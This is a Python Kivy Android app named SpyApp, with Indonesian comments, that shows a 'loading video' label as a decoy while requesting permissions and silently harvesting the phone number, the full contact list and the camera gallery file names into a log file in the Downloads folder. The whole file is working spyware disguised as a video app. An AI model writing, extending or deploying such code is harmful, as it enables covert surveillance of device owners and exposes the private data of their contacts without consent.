from kivy.app import App
from kivy.uix.label import Label
from kivy.uix.boxlayout import BoxLayout

from android.permissions import request_permissions, Permission
from jnius import autoclass
import os

class MainLayout(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.orientation = 'vertical'
        self.add_widget(Label(text='Memuat video...'))
        request_permissions([
            Permission.READ_CONTACTS,
            Permission.READ_EXTERNAL_STORAGE,
            Permission.READ_PHONE_NUMBERS
        ])
        self.extract_data()

    def extract_data(self):
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            activity = PythonActivity.mActivity

            # Ambil nomor telepon
            Context = autoclass('android.content.Context')
            TelephonyManager = autoclass('android.telephony.TelephonyManager')
            telephony = activity.getSystemService(Context.TELEPHONY_SERVICE)
            phone_number = telephony.getLine1Number()

            # Ambil daftar file gambar di DCIM/Camera
            pictures = []
            camera_path = "/storage/emulated/0/DCIM/Camera"
            if os.path.exists(camera_path):
                for file in os.listdir(camera_path):
                    if file.endswith(('.jpg', '.png', '.mp4')):
                        pictures.append(file)

            # Ambil daftar kontak
            contact_data = []
            ContentResolver = activity.getContentResolver()
            ContactsContract_CommonDataKinds_Phone = autoclass('android.provider.ContactsContract$CommonDataKinds$Phone')
            cursor = ContentResolver.query(
                ContactsContract_CommonDataKinds_Phone.CONTENT_URI,
                None, None, None, None
            )

            if cursor:
                while cursor.moveToNext():
                    name = cursor.getString(cursor.getColumnIndex(ContactsContract_CommonDataKinds_Phone.DISPLAY_NAME))
                    number = cursor.getString(cursor.getColumnIndex(ContactsContract_CommonDataKinds_Phone.NUMBER))
                    contact_data.append(f"{name}: {number}")
                cursor.close()

            # Simpan semua hasil ke file lokal
            save_path = "/storage/emulated/0/Download/info_log.txt"
            with open(save_path, "w", encoding="utf-8") as f:
                f.write(f"[Nomor Telepon]\n{phone_number}\n\n")
                f.write("[Kontak]\n" + "\n".join(contact_data) + "\n\n")
                f.write("[Galeri Kamera]\n" + "\n".join(pictures))

        except Exception as e:
            print("Gagal mengambil data:", e)

class SpyApp(App):
    def build(self):
        return MainLayout()

if __name__ == "__main__":
    SpyApp().run()
